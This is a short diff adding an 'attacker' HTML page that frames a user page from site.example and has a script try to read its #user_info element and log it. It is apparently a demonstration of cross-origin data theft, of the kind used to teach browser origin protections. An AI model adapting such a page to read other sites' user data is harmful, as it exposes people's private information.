@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>attacer.example</title>
+    <script>
+      function load() {
+        const userInfo = frm.document.querySelector("#user_info");
+        console.log(userInfo.textContent)
+      }
+    </script>
+  </head>
+  <body>
+    attacker.html
+    <iframe
+      name="frm" 
+      onload="load()"
+      src="http://site.example:3000/user.html"
+      width="800"
+    ></iframe>
+  </body>
+</html>
